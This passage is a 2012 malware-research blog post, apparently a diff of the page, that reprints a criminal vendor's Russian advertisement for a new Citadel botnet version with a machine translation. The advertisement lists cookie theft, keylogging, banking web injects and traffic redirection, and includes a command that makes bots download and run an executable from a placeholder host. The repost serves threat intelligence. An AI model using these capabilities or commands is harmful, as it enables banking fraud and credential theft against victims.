19px;">В информации по боту, можно посмотреть историю прогрузки веб-инжектов, также, можно поискать DEBUG-отчеты по боту и посмотреть историю компиляций и ошибок вебинжектов.</span><br /><span style="background-color: #f8f8f7; color: #5f5f5f; font-family: Verdana, Tahoma, Arial, 'Trebuchet MS', sans-serif, Georgia, Courier, 'Times New Roman', serif; font-size: 12px; line-height: 19px;">Если бот получает сразу несколько паков(бандлов) где разные режимы работы: dual, single, disabled то из всех бандлов выбирается автоматически самый "узкий режим" работы, например single.</span><br /><span style="background-color: #f8f8f7; color: #5f5f5f; font-family: Verdana, Tahoma, Arial, 'Trebuchet MS', sans-serif, Georgia, Courier, 'Times New Roman', serif; font-size: 12px; line-height: 19px;">Бот постоянно сверяет наличие обновления любого из вебинжектов, и если таковое имеется, то он его обновляет у себя.&nbsp;</span><br /><span style="background-color: #f8f8f7; color: #5f5f5f; font-family: Verdana, Tahoma, Arial, 'Trebuchet MS', sans-serif, Georgia, Courier, 'Times New Roman', serif; font-size: 12px; line-height: 19px;">[+] Опция в конфиге disable_httpgrabber расширена и позволяет полностью избавиться от HTTP-отчетов, отправляя на сервер только HTTPS-отчеты со всех браузеров, если установлено значение "1". Избавьтесь от лишней нагрузки на сервер.</span><br /><span style="background-color: #f8f8f7; color: #5f5f5f; font-family: Verdana, Tahoma, Arial, 'Trebuchet MS', sans-serif, Georgia, Courier, 'Times New Roman', serif; font-size: 12px; line-height: 19px;">[+] Добавлена секция "HttpVipUrls" в WebFilters, которая позволяет добавлять ссылки-исключения(http://) при отсутствии HTTP-граббинга (disable_httpgrabber 1).&nbsp;</span><br /><span style="background-color: #f8f8f7; color: #5f5f5f; font-family: Verdana, Tahoma, Arial, 'Trebuchet MS', sans-serif, Georgia, Courier, 'Times New Roman', serif; font-size: 12px; line-height: 19px;">[+] Полностью перереботан мануал, теперь удобная навигация + раскрыты некоторые тонкости работы, а также добавлены ответы на популярные вопросы, с примерами. Изменено лицензионное соглашение, которое содержится в мануале.</span><br /><br style="background-color: #f8f8f7; color: #5f5f5f; font-family: Verdana, Tahoma, Arial, 'Trebuchet MS', sans-serif, Georgia, Courier, 'Times New Roman', serif; font-size: 12px; line-height: 19px;" /><span style="background-color: #f8f8f7; color: #5f5f5f; font-family: Verdana, Tahoma, Arial, 'Trebuchet MS', sans-serif, Georgia, Courier, 'Times New Roman', serif; font-size: 12px; line-height: 19px;">Для получения новой версии, размещаем заявку в Jabber'e в таком формате: "&lt;login в CRM&gt; размещаю заявку на получение новой версии". Оплата поддержки должна быть своевременной, те, у кого задолжность более 3 месяцев - новую версию&nbsp;</span><b style="background-color: #f8f8f7; color: #5f5f5f; font-family: Verdana, Tahoma, Arial, 'Trebuchet MS', sans-serif, Georgia, Courier, 'Times New Roman', serif; font-size: 12px; line-height: 19px;">не</b><span style="background-color: #f8f8f7; color: #5f5f5f; font-family: Verdana, Tahoma, Arial, 'Trebuchet MS', sans-serif, Georgia, Courier, 'Times New Roman', serif; font-size: 12px; line-height: 19px;">&nbsp;получают. Срок выдачи от 3 до 72 часов. Если у вас имеется лицензированный партнер или саппорт, сразу пишите об этом в заявке до выдачи, а не после.</span><br /><br style="background-color: #f8f8f7; color: #5f5f5f; font-family: Verdana, Tahoma, Arial, 'Trebuchet MS', sans-serif, Georgia, Courier, 'Times New Roman', serif; font-size: 12px; line-height: 19px;" /><span style="background-color: #f8f8f7; color: #5f5f5f; font-family: Verdana, Tahoma, Arial, 'Trebuchet MS', sans-serif, Georgia, Courier, 'Times New Roman', serif; font-size: 12px; line-height: 19px;">Для старых клиентов, обновление включено в абонентскую плату, для новых, цена базовой комплектации составляет теперь&nbsp;</span><b style="background-color: #f8f8f7; color: #5f5f5f; font-family: Verdana, Tahoma, Arial, 'Trebuchet MS', sans-serif, Georgia, Courier, 'Times New Roman', serif; font-size: 12px; line-height: 19px;">$3931.00</b><br /><br style="background-color: #f8f8f7; color: #5f5f5f; font-family: Verdana, Tahoma, Arial, 'Trebuchet MS', sans-serif, Georgia, Courier, 'Times New Roman', serif; font-size: 12px; line-height: 19px;" /><span style="background-color: #f8f8f7; color: #5f5f5f; font-family: Verdana, Tahoma, Arial, 'Trebuchet MS', sans-serif, Georgia, Courier, 'Times New Roman', serif; font-size: 12px; line-height: 19px;">Jabber для покупки и обновлений:&nbsp;</span><b style="background-color: #f8f8f7; color: #5f5f5f; font-family: Verdana, Tahoma, Arial, 'Trebuchet MS', sans-serif, Georgia, Courier, 'Times New Roman', serif; font-size: 12px; line-height: 19px;">aquabox@lugmen.org.ar</b><br /><span style="background-color: #f8f8f7; color: #5f5f5f; font-family: Verdana, Tahoma, Arial, 'Trebuchet MS', sans-serif, Georgia, Courier, 'Times New Roman', serif; font-size: 12px; line-height: 19px;">Саппорт в праве отказать в продаже лицензии без объяснения причины. Поддержка клиентов на уровне сложных технических вопросов отменена из-за большого количества, обменивайтесь опытом с коллегами через CRM либо форумы.</span><br /><span style="background-color: #f8f8f7; color: #5f5f5f; font-family: Verdana, Tahoma, Arial, 'Trebuchet MS', sans-serif, Georgia, Courier, 'Times New Roman', serif; font-size: 12px; line-height: 19px;"><br /></span><span style="background-color: #f8f8f7; color: #5f5f5f; font-family: Verdana, Tahoma, Arial, 'Trebuchet MS', sans-serif, Georgia, Courier, 'Times New Roman', serif; font-size: 12px; line-height: 19px;"></span>---------------------------------- <br /><u style="background-color: white; color: #333333; font-family: 'Helvetica Neue Light', HelveticaNeue-Light, 'Helvetica Neue', Helvetica, Arial, sans-serif; font-size: 14px; line-height: 19px; text-align: justify;">Google Translation :</u><span style="background-color: white; color: #333333; font-family: 'Helvetica Neue Light', HelveticaNeue-Light, 'Helvetica Neue', Helvetica, Arial, sans-serif; line-height: 19px; text-align: justify;"><span style="font-size: 14px;">&nbsp;(</span><a href="http://pastebin.com/jCQXKFsy" style="font-size: 14px;">Pastebin</a><span style="font-size: 14px;">) - (</span><span style="font-size: xx-small;"><i>if you want to correct this raw&nbsp;google translation, drop a comment or DM on Twitter</i>&nbsp;</span></span><span style="background-color: white; color: #333333; font-family: 'Helvetica Neue Light', HelveticaNeue-Light, 'Helvetica Neue', Helvetica, Arial, sans-serif; font-size: 14px; line-height: 19px; text-align: justify;">)</span><br /><a href="http://3.bp.blogspot.com/-s-cPkJWsMzE/UGzZej0SbZI/AAAAAAAABZY/87z_Y2Jo_y8/s1600/fd497e5b4853.png" imageanchor="1" style="clear: left; margin-bottom: 1em; margin-right: 1em; text-align: center;"><img border="0" src="http://3.bp.blogspot.com/-s-cPkJWsMzE/UGzZej0SbZI/AAAAAAAABZY/87z_Y2Jo_y8/s1600/fd497e5b4853.png" /></a><br /><span style="background-color: #f8f8f7; font-size: 12px; line-height: 19px;"><span style="color: #5f5f5f; font-family: Verdana, Tahoma, Arial, Trebuchet MS, sans-serif, Georgia, Courier, Times New Roman, serif;"></span></span><br /><span style="color: #5f5f5f; font-family: Verdana, Tahoma, Arial, Trebuchet MS, sans-serif, Georgia, Courier, Times New Roman, serif;">The latest tools and tools for professional work collected for you in the new version.</span><br /><span style="color: #5f5f5f; font-family: Verdana, Tahoma, Arial, Trebuchet MS, sans-serif, Georgia, Courier, Times New Roman, serif;">Fixed problems with otstuk and vitality, work has become more pleasant, considered the most important requirements.</span><br /><span style="color: #5f5f5f; font-family: Verdana, Tahoma, Arial, Trebuchet MS, sans-serif, Georgia, Courier, Times New Roman, serif;">Taken into account the whole experience last season, beginners will be much easier to work with the new version than the previous ones.</span><br /><span style="color: #5f5f5f; font-family: Verdana, Tahoma, Arial, Trebuchet MS, sans-serif, Georgia, Courier, Times New Roman, serif;">Is now open for free access WebInjects new technology to the public.</span><br /><span style="color: #5f5f5f; font-family: Verdana, Tahoma, Arial, Trebuchet MS, sans-serif, Georgia, Courier, Times New Roman, serif;"><br /></span><span style="color: #5f5f5f; font-family: Verdana, Tahoma, Arial, Trebuchet MS, sans-serif, Georgia, Courier, Times New Roman, serif;">[+] Did a quick check of bots on Online-status on the main list of page.</span><br /><span style="color: #5f5f5f; font-family: Verdana, Tahoma, Arial, Trebuchet MS, sans-serif, Georgia, Courier, Times New Roman, serif;">[+] Ability to add bot in the "Favorites" without reporting.</span><br /><span style="color: #5f5f5f; font-family: Verdana, Tahoma, Arial, Trebuchet MS, sans-serif, Georgia, Courier, Times New Roman, serif;">[+] Made detection system privileges (admin / user), is displayed in the "Information on bot [flags]"</span><br /><span style="color: #5f5f5f; font-family: Verdana, Tahoma, Arial, Trebuchet MS, sans-serif, Georgia, Courier, Times New Roman, serif;">[+] Sort by date screenshots.</span><br /><span style="color: #5f5f5f; font-family: Verdana, Tahoma, Arial, Trebuchet MS, sans-serif, Georgia, Courier, Times New Roman, serif;">[+] Added ability to connect to other databases Citadel (as remote database, and old / disabled admin) to search for reports.</span><br /><span style="color: #5f5f5f; font-family: Verdana, Tahoma, Arial, Trebuchet MS, sans-serif, Georgia, Courier, Times New Roman, serif;">[+] Expand your search in the database: you can specify the stop words, such as twitter.com, which will not appear in the issuance of the results, not to litter logging debris. Also, you can specify the contents of the search does not report, and for URL Mask, it increases the speed of data retrieval.</span><br /><span style="color: #5f5f5f; font-family: Verdana, Tahoma, Arial, Trebuchet MS, sans-serif, Georgia, Courier, Times New Roman, serif;">[+] Enhanced Jabber notifier added Next event:</span><br /><span style="color: #5f5f5f; font-family: Verdana, Tahoma, Arial, Trebuchet MS, sans-serif, Georgia, Courier, Times New Roman, serif;">- Masks BotID the event "Boat reached the Online"</span><br /><span style="color: #5f5f5f; font-family: Verdana, Tahoma, Arial, Trebuchet MS, sans-serif, Georgia, Courier, Times New Roman, serif;">- Be notified when a specific software from the "installed software"</span><br /><span style="color: #5f5f5f; font-family: Verdana, Tahoma, Arial, Trebuchet MS, sans-serif, Georgia, Courier, Times New Roman, serif;">- Mask to the contents of the report CMD.</span><br /><span style="color: #5f5f5f; font-family: Verdana, Tahoma, Arial, Trebuchet MS, sans-serif, Georgia, Courier, Times New Roman, serif;">- Parallel convenient entry in the log-file of all events, in addition to Jabber-notifications.</span><br /><span style="color: #5f5f5f; font-family: Verdana, Tahoma, Arial, Trebuchet MS, sans-serif, Georgia, Courier, Times New Roman, serif;"><b>[+] Added a free module of grabbing cookies in Firefox, exports all the cookies from the browser and sends you.</b></span><br /><span style="color: #5f5f5f; font-family: Verdana, Tahoma, Arial, Trebuchet MS, sans-serif, Georgia, Courier, Times New Roman, serif;">[+] Fixed delete reports.</span><br /><span style="color: #5f5f5f; font-family: Verdana, Tahoma, Arial, Trebuchet MS, sans-serif, Georgia, Courier, Times New Roman, serif;">[+] Auto-Update Statistics homepage.</span><br /><span style="color: #5f5f5f; font-family: Verdana, Tahoma, Arial, Trebuchet MS, sans-serif, Georgia, Courier, Times New Roman, serif;">[+] Button [Decode] on the reports, which can decode urlencode (% 0D) sequences in a convenient form.</span><br /><span style="color: #5f5f5f; font-family: Verdana, Tahoma, Arial, Trebuchet MS, sans-serif, Georgia, Courier, Times New Roman, serif;">[+] Added the ability to determine the online / offline status of the bot in the API.</span><br /><span style="color: #5f5f5f; font-family: Verdana, Tahoma, Arial, Trebuchet MS, sans-serif, Georgia, Courier, Times New Roman, serif;">[+] Completely reworked the algorithm checks the module WebSocks.</span><br /><span style="color: #5f5f5f; font-family: Verdana, Tahoma, Arial, Trebuchet MS, sans-serif, Georgia, Courier, Times New Roman, serif;">[+] Show scripts (commands) by page.</span><br /><span style="color: #5f5f5f; font-family: Verdana, Tahoma, Arial, Trebuchet MS, sans-serif, Georgia, Courier, Times New Roman, serif;">[+] Added ability to send messages to a jabber api.php (uses your personal settings in the admin)</span><br /><span style="color: #5f5f5f; font-family: Verdana, Tahoma, Arial, Trebuchet MS, sans-serif, Georgia, Courier, Times New Roman, serif;">[+] Now, every HTTP / HTTPS report added cookies (Firefox / IE), as well as headlines:</span><br /><span style="color: #5f5f5f; font-family: Verdana, Tahoma, Arial, Trebuchet MS, sans-serif, Georgia, Courier, Times New Roman, serif;"><b>[+] Completely redesigned internal encryption algorithm otstuk many times higher, longer survival. You need to migrate to the new version, run the command user_execute http://www.host.com/1351.exe. RC4 key must match.</b></span><br /><span style="color: #5f5f5f; font-family: Verdana, Tahoma, Arial, Trebuchet MS, sans-serif, Georgia, Courier, Times New Roman, serif;">[+] Adjust Browser Keylogger'a. Automatically adds a space if after the last key press was 5 seconds, you need to visually separate input-fields.</span><br /><span style="color: #5f5f5f; font-family: Verdana, Tahoma, Arial, Trebuchet MS, sans-serif, Georgia, Courier, Times New Roman, serif;">[+] Fixed an issue with a 302 redirect, did not work when inject, if you are following a link via javascript.</span><br /><span style="color: #5f5f5f; font-family: Verdana, Tahoma, Arial, Trebuchet MS, sans-serif, Georgia, Courier, Times New Roman, serif;">[+] Plaintext logs will open in a new tab.</span><br /><span style="color: #5f5f5f; font-family: Verdana, Tahoma, Arial, Trebuchet MS, sans-serif, Georgia, Courier, Times New Roman, serif;">[+] Fixed bots failure of the online when the GeoIP.</span><br /><span style="color: #5f5f5f; font-family: Verdana, Tahoma, Arial, Trebuchet MS, sans-serif, Georgia, Courier, Times New Roman, serif;">[+] Display the comment to the boat in the VNC-module by the mouse, as well as sending a comment to jabber with information about a connection.</span><br /><span style="color: #5f5f5f; font-family: Verdana, Tahoma, Arial, Trebuchet MS, sans-serif, Georgia, Courier, Times New Roman, serif;">[+] Ability to specify DnsFilters (redirect traffic) mask with an asterisk (*), you can make the mask more flexible.</span><br /><span style="color: #5f5f5f; font-family: Verdana, Tahoma, Arial, Trebuchet MS, sans-serif, Georgia, Courier, Times New Roman, serif;"><b>[+] WebInjects. The module is designed for easy interaction with Holder through technology injected into browsers. The module allows any progruzit inject specific BotID, country or botnet in just a few minutes, without having to edit the config. The module works through the admin panel.</b></span><br /><span style="color: #5f5f5f; font-family: Verdana, Tahoma, Arial, Trebuchet MS, sans-serif, Georgia, Courier, Times New Roman, serif;">Brief educational program:</span><br /><span style="color: #5f5f5f; font-family: Verdana, Tahoma, Arial, Trebuchet MS, sans-serif, Georgia, Courier, Times New Roman, serif;">In config bot section DynamicConfig, fit parameter url_webinjects "http://www.host.com/file.php" (path to file.php). Boat pulls the file every 2 minutes, taking out a packet injector, which gives the distribution of the system of granting the injector.</span><br /><span style="color: #5f5f5f; font-family: Verdana, Tahoma, Arial, Trebuchet MS, sans-serif, Georgia, Courier, Times New Roman, serif;">From there VebInzhekty 2 sections: "The group vebinzhektov" and "Paki", the first is the structure of "group - injected - Members (admitted to the group)," and is responsible for managing all of the injector. The second section is responsible for setting the spread of the injector (which deliver bots inject and how much).</span><br /><span style="color: #5f5f5f; font-family: Verdana, Tahoma, Arial, Trebuchet MS, sans-serif, Georgia, Courier, Times New Roman, serif;">In the main menu, vrazdele "Users", creating a new user has rights "r_botnet_webinjects_coder" is a user who can manage the group, which will appoint an administrator privileges. In other words, if you make a developer injected in admin account and create it, it will have the right to form their own injector and edit them, others injected he sees only displays a list of his own group injected. Ie you can create 5 groups and create a 5-coders inject, so each person is responsible for their group (set injector). You see the statistics of what happens in the overall system and can unites all groups injected into one "pack", which will be progruzhen any and all bots, or a single category of boats in the class: a country or a botnet.</span><br /><span style="color: #5f5f5f; font-family: Verdana, Tahoma, Arial, Trebuchet MS, sans-serif, Georgia, Courier, Times New Roman, serif;">In the admin area, a special convenient visual editor injected with syntax highlighting. Format is fully compatible with zevsoformatom.</span><br /><span style="color: #5f5f5f; font-family: Verdana, Tahoma, Arial, Trebuchet MS, sans-serif, Georgia, Courier, Times New Roman, serif;">Image do several modes for packs.</span><br /><span style="color: #5f5f5f; font-family: Verdana, Tahoma, Arial, Trebuchet MS, sans-serif, Georgia, Courier, Times New Roman, serif;">Dual - when running a file with injected from the main config + vebinzhekty.</span><br /><span style="color: #5f5f5f; font-family: Verdana, Tahoma, Arial, Trebuchet MS, sans-serif, Georgia, Courier, Times New Roman, serif;">Single - when only vebinzhekty, and the local file with the injector is switched off.</span><br /><span style="color: #5f5f5f; font-family: Verdana, Tahoma, Arial, Trebuchet MS, sans-serif, Georgia, Courier, Times New Roman, serif;">Disabled - when vebinzhekty disabled, and local file with injector works.</span><br /><span style="color: #5f5f5f; font-family: Verdana, Tahoma, Arial, Trebuchet MS, sans-serif, Georgia, Courier, Times New Roman, serif;">If you accidentally make a mistake somewhere in the injector, the vebinzhekty be gathered together and you have to DEBUG-report with information which pack (bundle) was not assembled.</span><br /><span style="color: #5f5f5f; font-family: Verdana, Tahoma, Arial, Trebuchet MS, sans-serif, Georgia, Courier, Times New Roman, serif;">The information on the boat, you can see the history of injection test web injected, also, you can search DEBUG-bot reports and look at the history and compilation errors vebinzhektov.</span><br /><span style="color: #5f5f5f; font-family: Verdana, Tahoma, Arial, Trebuchet MS, sans-serif, Georgia, Courier, Times New Roman, serif;">If the bot receives several packs (bundles) where different modes of operation: dual, single, disabled then all Bandlov automatically selected the most "narrow mode", such as single.</span><br /><span style="color: #5f5f5f; font-family: Verdana, Tahoma, Arial, Trebuchet MS, sans-serif, Georgia, Courier, Times New Roman, serif;">Boat constantly checks for updates of any vebinzhektov, and if so, then it updates its host.</span><br /><span style="color: #5f5f5f; font-family: Verdana, Tahoma, Arial, Trebuchet MS, sans-serif, Georgia, Courier, Times New Roman, serif;">[+] Option in the config disable_httpgrabber expanded and allows to get rid of HTTP-reports sent to the server HTTPS-only reports on all browsers, if set to "1". Get rid of the extra load on the server.</span><br /><span style="color: #5f5f5f; font-family: Verdana, Tahoma, Arial, Trebuchet MS, sans-serif, Georgia, Courier, Times New Roman, serif;">[+] Added the section "HttpVipUrls" in WebFilters, which allows you to add links-exclusion (http://) in the absence of HTTP-grabbing (disable_httpgrabber 1).</span><br /><span style="color: #5f5f5f; font-family: Verdana, Tahoma, Arial, Trebuchet MS, sans-serif, Georgia, Courier, Times New Roman, serif;">[+] Fully pererebotan manual now easy navigation + revealed some details of the work, and also added the answers to frequently asked questions, with examples. Changed the license agreement, which is contained in the manual.</span><br /><span style="color: #5f5f5f; font-family: Verdana, Tahoma, Arial, Trebuchet MS, sans-serif, Georgia, Courier, Times New Roman, serif;"><br /></span><span style="color: #5f5f5f; font-family: Verdana, Tahoma, Arial, Trebuchet MS, sans-serif, Georgia, Courier, Times New Roman, serif;">To get the new version, place a request in Jabber'e in this format: "&lt;login CRM&gt; in place an application for a new version." Payment of support must be timely, those with debts of more than 3 months - do not get the new version. Term delivery from 3 to 72 hours. If you have a licensed partner or a support, just write it in the application to the issue, and not after.</span><br /><span style="color: #5f5f5f; font-family: Verdana, Tahoma, Arial, Trebuchet MS, sans-serif, Georgia, Courier, Times New Roman, serif;"><br /></span><span style="color: #5f5f5f; font-family: Verdana, Tahoma, Arial, Trebuchet MS, sans-serif, Georgia, Courier, Times New Roman, serif;">For existing customers, the update is included in the monthly fee for the new price of the basic configuration is now $ 3931.00</span><br /><span style="color: #5f5f5f; font-family: Verdana, Tahoma, Arial, Trebuchet MS, sans-serif, Georgia, Courier, Times New Roman, serif;"><br /></span><span style="color: #5f5f5f; font-family: Verdana, Tahoma, Arial, Trebuchet MS, sans-serif, Georgia, Courier, Times New Roman, serif;">Jabber for purchases and upgrades: aquabox@lugmen.org.ar</span><br /><span style="color: #5f5f5f; font-family: Verdana, Tahoma, Arial, Trebuchet MS, sans-serif, Georgia, Courier, Times New Roman, serif;">A support of the right to refuse the sale of a license without giving a reason. Customer support at the level of the complex technical issues canceled due to the number, share experience with colleagues through CRM or forums.</span><br /><span style="color: #5f5f5f; font-family: Verdana, Tahoma, Arial, Trebuchet MS, sans-serif, Georgia, Courier, Times New Roman, serif;"><br /></span><span style="color: #5f5f5f; font-family: Verdana, Tahoma, Arial, Trebuchet MS, sans-serif, Georgia, Courier, Times New Roman, serif;"></span><br />---------------------------------- <br /><span style="color: #5f5f5f; font-family: Verdana, Tahoma, Arial, 'Trebuchet MS', sans-serif, Georgia, Courier, 'Times New Roman', serif;">Looking for a sample &nbsp;?</span><br /><span style="color: #5f5f5f; font-family: Verdana, Tahoma, Arial, Trebuchet MS, sans-serif, Georgia, Courier, Times New Roman, serif;"><a href="http://goo.gl/BBRKU">91b64502a89d6c47d1adbde3ebbf2532</a>&nbsp;</span><br /><span style="color: #5f5f5f; font-family: Verdana, Tahoma, Arial, Trebuchet MS, sans-serif, Georgia, Courier, Times New Roman, serif;">Want to read more ?</span><br /><span style="color: #5f5f5f; font-family: Verdana, Tahoma, Arial, Trebuchet MS, sans-serif, Georgia, Courier, Times New Roman, serif;"><a href="http://malware.dontneedcoffee.com/2012/07/inside-citadel-1.3.4.5-cncNbuilder.html">Inside Citadel 1.3.4.5 C&amp;C &amp; Builder - Botnet Control Panel</a>&nbsp;- 2012-07-29</span><br /><span style="color: #5f5f5f; font-family: Verdana, Tahoma, Arial, Trebuchet MS, sans-serif, Georgia, Courier, Times New Roman, serif;"><a href="http://malware.dontneedcoffee.com/2012/06/update-to-citadel-v1345.html">Update to Citadel : v.1.3.4.5</a>&nbsp;- 2012-06-11</span><br /><a href="http://malware.dontneedcoffee.com/2012/04/citadel-v1335.html">Update to Citadel : v1.3.3.5</a>&nbsp;- 2012-04-03
+			</div>
+
+			
+						<div id="page-meta" class="t30">
+				<p>
+					<!-- Look the author details up from the site config. -->
+					
+					<!-- Output author details if some exist. -->
+					
+					<span itemprop="author" itemscope itemtype="http://schema.org/Person"><span itemprop="name" class="pr20 icon-edit"><a href="https://malware.dontneedcoffee.com/" target="_blank"> Kafeine</a></span>
+				</span>
+				
+
+				
+				<time class="icon-calendar pr20" datetime="2012-10-04" itemprop="datePublished"> 2012-10-04</time>
+				
+
+				<span class="icon-archive pr20"> </span>
+				<br />
+				<span class="pr20"><span class="icon-price-tag pr10"> update</span> <span class="icon-price-tag pr10"> botnet</span> <span class="icon-price-tag pr10"> ad</span> <span class="icon-price-tag pr10"> citadel</span> <span class="icon-price-tag pr10"> no comment</span> </span>
+			</p>
+
+			<div id="post-nav" class="row">
+				
+				<div class="small-5 columns"><a class="button small radius prev" href="http://malware2.dontneedcoffee.com/2012/09/redkitnomoremoney.html">&laquo; Redkit : No more money ! Traffic US, CA, GB, AU</a></div><!-- /.small-4.columns -->
+				
+				<div class="small-2 columns text-center"><a class="radius button small" href="http://malware2.dontneedcoffee.com/blog/archive/" title="Blog Archive">Archive</a></div><!-- /.small-4.columns -->
+				
+				<div class="small-5 columns text-right"><a class="button small radius next" href="http://malware2.dontneedcoffee.com/2012/10/newcoolek.html">Cool Exploit Kit - A new Browser Exploit Pack on the Battlefield with a "Duqu" like font drop &raquo;</a></div><!-- /.small-4.columns -->
+				
+			</div>
+			</div><!--  /.page-meta -->
+			
+
+			
+		</article>
+	</div><!-- /.medium-8.columns -->
+
+
+	
+
+
+	
+</div><!-- /.row -->
+
+
+	
+	    <div id="up-to-top" class="row">
+      <div class="small-12 columns" style="text-align: right;">
+        <a class="iconfont" href="#top-of-page">&#xf108;</a>
+      </div><!-- /.small-12.columns -->
+    </div><!-- /.row -->
+
+
+    <footer id="footer-content" class="bg-grau">
+      <div id="footer">
+        <div class="row">
+          <div class="medium-6 large-5 columns">
+            <h5 class="shadow-black">About This Site</h5>
+
+            <p class="shadow-black">
+              Sleep is a symptom of  »caffeine« deprivation!
+              <a href="http://malware2.dontneedcoffee.com/info/">More ›</a>
+            </p>
+          </div><!-- /.large-6.columns -->
+
+
+          <div class="small-6 medium-3 large-3 large-offset-1 columns">
+            
+              
+                <h5 class="shadow-black">Services</h5>
+              
+            
+              
+            
+              
+            
+              
+            
+              
+            
+
+              <ul class="no-bullet shadow-black">
+              
+                
+                  <li >
+                    <a href="http://malware2.dontneedcoffee.com"  title=""></a>
+                  </li>
+              
+                
+                  <li >
+                    <a href="http://malware2.dontneedcoffee.com/contact/"  title="Contact">Contact</a>
+                  </li>
+              
+                
+                  <li >
+                    <a href="http://malware2.dontneedcoffee.com/feed.xml"  title="Subscribe to RSS Feed">RSS</a>
+                  </li>
+              
+                
+                  <li >
+                    <a href="http://malware2.dontneedcoffee.com/atom.xml"  title="Subscribe to Atom Feed">Atom</a>
+                  </li>
+              
+                
+                  <li >
+                    <a href="http://malware2.dontneedcoffee.com/sitemap.xml"  title="Sitemap for Google Webmaster Tools">sitemap.xml</a>
+                  </li>
+              
+              </ul>
+          </div><!-- /.large-4.columns -->
+
+
+          <div class="small-6 medium-3 large-3 columns">
+            
+              
+                <h5 class="shadow-black">Merci</h5>
+              
+            
+              
+            
+              
+            
+
+            <ul class="no-bullet shadow-black">
+            
+              
+                <li >
+                  <a href="http://malware2.dontneedcoffee.com"  title=""></a>
+                </li>
+            
+              
+                <li class="network-misp" >
+                  <a href="https://github.com/MISP" target="_blank"  title="MISP Project - Open Source Threat Intelligence Platform & Open Standards For Threat Information Sharing">MISP</a>
+                </li>
+            
+              
+                <li class="network-cuckoo" >
+                  <a href="https://cuckoosandbox.org/" target="_blank"  title="Automate Malware Analysis">Cuckoo</a>
+                </li>
+            
+            </ul>
+          </div><!-- /.large-3.columns -->
+        </div><!-- /.row -->
+
+      </div><!-- /#footer -->
+
+
+      <div id="subfooter">
+        <nav class="row">
+          <section id="subfooter-left" class="small-12 medium-6 columns credits">
+            
+          </section>
+
+          <section id="subfooter-right" class="small-12 medium-6 columns">
+            <ul class="inline-list social-icons">
+            
+              <li><a href="http://github.com/Kafeine" target="_blank" class="icon-github" title="Code and more..."></a></li>
+            
+              <li><a href="http://twitter.com/Kafeine" target="_blank" class="icon-twitter" title="Last tweets"></a></li>
+            
+            </ul>
+          </section>
+        </nav>
+      </div><!-- /#subfooter -->
+    </footer>
+
+	
+
+	
+
+
+<script src="http://malware2.dontneedcoffee.com/assets/js/javascript.min.js"></script>
+
+
+
+
+
+
+
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+  ga('create', 'UA-3016897-22', 'auto');
+  ga('set', 'anonymizeIp', true);
+  ga('send', 'pageview');
+
+</script>
+
+
+
+
+
+
+
+
+</body>
+</html>
+
